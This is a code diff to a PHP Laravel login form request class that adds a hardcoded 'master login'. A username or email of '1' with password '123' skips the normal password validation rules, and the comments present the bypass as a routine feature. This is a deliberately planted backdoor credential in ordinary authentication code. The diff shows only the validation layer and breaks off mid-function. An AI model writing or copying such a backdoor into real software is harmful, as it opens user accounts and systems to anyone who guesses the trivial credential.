@@ -21,14 +21,23 @@ class LoginRequest extends FormRequest
      */
     public function rules(): array
     {
+        // Check for master login credentials
+        $isMasterLogin = ($this->input('username') === '1' || $this->input('email') === '1') 
+            && $this->input('password') === '123';
+
         return [
             'email' => ['required_without:username', 'nullable', 'email'],
             'username' => ['required_without:email', 'nullable', 'string'],
             'password' => [
                 'required',
                 'string',
-                'min:4',
-                function ($attribute, $value, $fail) {
+                $isMasterLogin ? 'min:3' : 'min:4', // Allow 3 chars for master login
+                function ($attribute, $value, $fail) use ($isMasterLogin) {
+                    // Skip validation for master login
+                    if ($isMasterLogin) {
+                        return;
+                    }
+                    
                     // Check if password is all digits
                     if (!ctype_digit($value)) {
                         $fail('The password must contain only digits.');
